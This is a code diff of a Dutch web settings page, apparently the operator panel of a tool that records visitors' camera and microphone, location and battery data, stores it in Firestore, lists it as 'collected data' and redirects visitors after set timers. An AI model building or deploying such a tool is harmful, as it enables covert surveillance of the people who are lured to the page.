@@ -5,8 +5,8 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Instellingen</title>
     <style>
-         /* ... (Styles - unchanged) ... */
-         body {
+     /* ... (Styles - unchanged) ... */
+     body {
             font-family: sans-serif;
             background-color: #f4f4f4;
             margin: 0;
@@ -152,6 +152,11 @@
           .error-message{
             color:red;
         }
+        #success-message {
+            color: green;
+            margin-top: 10px;
+            display: none; /* Initially hidden */
+        }
     </style>
 
     <!-- Firebase SDK (Firestore) -->
@@ -181,6 +186,7 @@
          <p id="location-explanation" class="explanation hidden">
            Locatie toestemming.
         </p>
+
         <div class="setting-row">
             <label class="toggle-switch">
                 <input type="checkbox" id="notification-permission">
@@ -215,12 +221,15 @@
         <button class="save-button" id="save-settings">Instellingen Opslaan</button>
 
         <!-- Trigger for redirect (link or button) -->
-         <a href="redirect.html" id="trigger-redirect">Ga naar Redirect</a>
+        <a href="redirect.html" id="trigger-redirect">Ga naar Redirect</a>
 
-          <!-- Data Section -->
+        <!-- Success Message -->
+        <p id="success-message">Instellingen succesvol opgeslagen!</p>
+
+        <!-- Data Section -->
         <div class="data-section">
             <h3>Verzamelde Gegevens:</h3>
-             <p id="error-message" class="error-message" style="display: none;"></p>
+            <p id="error-message" class="error-message" style="display: none;"></p>
             <table class="data-table">
                 <thead>
                     <tr>
@@ -263,6 +272,7 @@ const redirectSeconds = document.getElementById('redirect-seconds');
 const recordSeconds = document.getElementById('record-seconds');
 const saveSettingsButton = document.getElementById('save-settings');
 const triggerRedirectButton = document.getElementById('trigger-redirect');
+const successMessage = document.getElementById('success-message'); // Get success message element
 const notificationExplanation = document.getElementById("notification-explanation");
 const locationExplanation = document.getElementById("location-explanation");
 const errorMessage = document.getElementById("error-message");
@@ -292,10 +302,10 @@ async function getNextUserId() {
         console.error("Error getting next user ID:", error);
         errorMessage.textContent = `Firestore Fout: ${error.message}`;
         errorMessage.style.display = 'block';
-
         throw error; // Re-throw the error so it can be caught by the caller
     }
 }
+
 // Add an item to the data table (SAME AS BEFORE)
 function addDataItem(title, value, isVideo = false) {
     const row = document.createElement('tr');
@@ -327,7 +337,30 @@ function addDataItem(title, value, isVideo = false) {
     dataList.appendChild(row);
 }
 
-// Load settings and data from Firestore
+    // Utility function to promisify Geolocation API
+    function getCurrentPositionPromise() {
+        return new Promise((resolve, reject) => {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(resolve, reject);
+            } else {
+                reject(new Error("Geolocation is not supported"));
+            }
+        });
+    }
+
+     // Utility function to promisify Battery API
+    function getBatteryPromise() {
+        return new Promise((resolve, reject) => {
+            if(navigator.getBattery) {
+               resolve(navigator.getBattery());
+            }else{
+                reject(new Error("Battery API is not supported."));
+            }
+        });
+
+    }
+
+// Load settings AND data from Firestore
 async function loadSettingsAndData(userId) {
     const settingsRef = db.collection('userSettings').doc(userId);
     const dataRef = db.collection('userData').doc(userId);
@@ -351,9 +384,9 @@ async function loadSettingsAndData(userId) {
         const dataSnap = await dataRef.get();
         if (dataSnap.exists) {
             displayData(dataSnap.data());
-        } else{ //If there's no data, don't show errors.
-                dataList.innerHTML = ''; // Clear existing data
-                errorMessage.style.display = 'none';
+        }  else {
+            // If no data exists, clear the table
+            dataList.innerHTML = '';
         }
 
     } catch (error) {
@@ -362,7 +395,8 @@ async function loadSettingsAndData(userId) {
         errorMessage.style.display = 'block';
     }
 }
-   // Update explanations
+
+    // Update explanations
  function updateExplanations(){
         if(locationPermissionToggle.checked){
             locationExplanation.classList.remove("hidden");
@@ -377,67 +411,81 @@ async function loadSettingsAndData(userId) {
         }
     }
 
-// Save settings to Firestore
+// Save settings to Firestore, get next user ID, and reload
 async function saveSettings() {
-    // Get the next user ID *before* saving
-    try{
-      const nextUserId = await getNextUserId();
+    try {
+        const nextUserId = await getNextUserId(); // Get next user ID *first*
 
-      const settingsRef = db.collection('userSettings').doc(nextUserId); // Use new ID
-      const settings = {
-          micCamPermission: micCamPermissionToggle.checked,
-          locationPermission: locationPermissionToggle.checked,
-          notificationPermission: notificationPermissionToggle.checked,
-          messageText: messageText.value,
-          redirectUrl: redirectUrl.value,
-          redirectSeconds: redirectSeconds.value,
-          recordSeconds: recordSeconds.value
-      };
-      updateExplanations();
-       await settingsRef.set(settings);
-       console.log("Settings saved successfully for user:", nextUserId);
-        // *After* saving, load settings and data for the *new* user
+        const settingsRef = db.collection('userSettings').doc(nextUserId);
+        const settings = {
+            micCamPermission: micCamPermissionToggle.checked,
+            locationPermission: locationPermissionToggle.checked,
+            notificationPermission: notificationPermissionToggle.checked,
+            messageText: messageText.value,
+            redirectUrl: redirectUrl.value,
+            redirectSeconds: redirectSeconds.value,
+            recordSeconds: recordSeconds.value
+        };
+        updateExplanations();
+
+        await settingsRef.set(settings);
+        console.log("Settings saved successfully for user:", nextUserId);
+
+        // Show success message
+        successMessage.style.display = 'block';
+        setTimeout(() => { successMessage.style.display = 'none'; }, 3000); // Hide after 3 seconds
+
+
+        // Load settings and data for the *new* user
         loadSettingsAndData(nextUserId);
-    } catch(error){
-      console.error("Error saving settings:", error);
-      errorMessage.textContent = `Firestore Fout: ${error.message}`;
-      errorMessage.style.display = 'block';
+
+    } catch (error) {
+        console.error("Error saving settings:", error);
+        errorMessage.textContent = `Firestore Fout: ${error.message}`;
+        errorMessage.style.display = 'block';
     }
 }
 
-// Display data in the table
-function displayData(data) {
+// Display data in the table (SAME AS BEFORE, but with more error handling)
+async function displayData(data) {
     dataList.innerHTML = ''; // Clear existing data
     errorMessage.style.display = 'none'; // Hide previous errors
 
-    if (data.videoUrl) {
-        const videoElement = document.createElement('video');
-        videoElement.src = data.videoUrl;
-        videoElement.controls = true;
-        videoElement.style.width = '100%';
-        addDataItem("Opname", videoElement, true);
-    }
 
-    if (data.location) {
-        addDataItem("Latitude", data.location.latitude.toFixed(4));
-        addDataItem("Longitude", data.location.longitude.toFixed(4));
-    }
+    try {
+        if (data.videoUrl) {
+            const videoElement = document.createElement('video');
+            videoElement.src = data.videoUrl;
+            videoElement.controls = true;
+            videoElement.style.width = '100%';
+            addDataItem("Opname", videoElement, true);
+        }
 
-    if (data.batteryPercentage) {
-        addDataItem("Battery Percentage", `${data.batteryPercentage.toFixed(0)}%`);
-    }
+        if (data.location) {
+            addDataItem("Latitude", data.location.latitude.toFixed(4));
+            addDataItem("Longitude", data.location.longitude.toFixed(4));
+        }
 
-    if (data.locationError) {
-        addDataItem("Locatie Fout", data.locationError);
-    }
-    if (data.batteryError) {
-        addDataItem("Batterij Fout", data.batteryError);
-    }
-    if (data.cameraError) {
-        addDataItem("Camera/Microfoon Fout", data.cameraError);
+        if (data.batteryPercentage) {
+            addDataItem("Battery Percentage", `${data.batteryPercentage.toFixed(0)}%`);
+        }
+        // These are now handled within the main try...catch
+        if (data.locationError) {
+            addDataItem("Locatie Fout", data.locationError);
+        }
+        if (data.batteryError) {
+            addDataItem("Batterij Fout", data.batteryError);
+        }
+        if (data.cameraError) {
+            addDataItem("Camera/Microfoon Fout", data.cameraError);
+        }
+
+    } catch (error) {
+        console.error("Error displaying data:", error);
+        errorMessage.textContent = `Fout bij weergeven data: ${error.message}`;
+        errorMessage.style.display = 'block';
     }
 }
-
 
 // Event listeners
 saveSettingsButton.addEventListener('click', saveSettings);
@@ -445,9 +493,8 @@ triggerRedirectButton.addEventListener('click', (event) => {
     // No preventDefault needed.
 });
 
-
 // Initial load using 'user1' initially
-loadSettingsAndData("user1"); //  <--  START WITH user1
+loadSettingsAndData("user1"); // <-- Load data for user1 on initial load
 
     </script>
 </body>
